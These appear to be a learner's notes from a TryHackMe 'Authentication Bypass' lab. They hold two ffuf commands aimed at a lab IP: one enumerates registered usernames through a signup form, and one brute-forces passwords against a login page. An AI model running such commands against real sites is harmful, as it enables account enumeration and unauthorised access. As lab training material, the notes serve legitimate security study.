![](https://tryhackme-images.s3.amazonaws.com/room-icons/098ee61b8842b7e6fc27e9eea9d7e1dc.png)

# Authentication Bypass


## Bruteforcing


**User Signup Enumeration**

```
 ffuf -w stuff/tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.17.37/customers/signup -mr "username already exists"
```


**Bruteforce Passwords**

```
ffuf -w valid_usernames.txt:W1,stuff/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.17.37/customers/login -fc 200
```

